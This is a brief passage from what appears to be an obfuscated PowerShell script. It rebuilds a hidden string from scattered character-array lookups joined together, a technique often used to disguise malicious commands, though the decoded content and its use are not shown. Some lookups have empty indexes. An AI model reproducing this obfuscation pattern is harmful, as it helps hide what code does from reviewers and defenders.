],$M[40],$M[70],$g[41],$G[85],$H[34],$H[],$g[44],$n[91],$s[86],$t[39],$S[29],$A[20],$s[88],$A[96],$S[61],$g[44],$G[52],$J[18],$x[86],$G[83],$t[20],$G[83],$g[65],$H[34],$H[47],$v[51],$M[49],$v[23],$x[51],$n[99],$H[87],$g[79],$s[44],$v[55],$z[36],$G[79],$v[69],$M[87],$S[90],$c[7],$n[97],$v[],$J[10],$G[17],$A[94],$J[35]) -JOIN "")
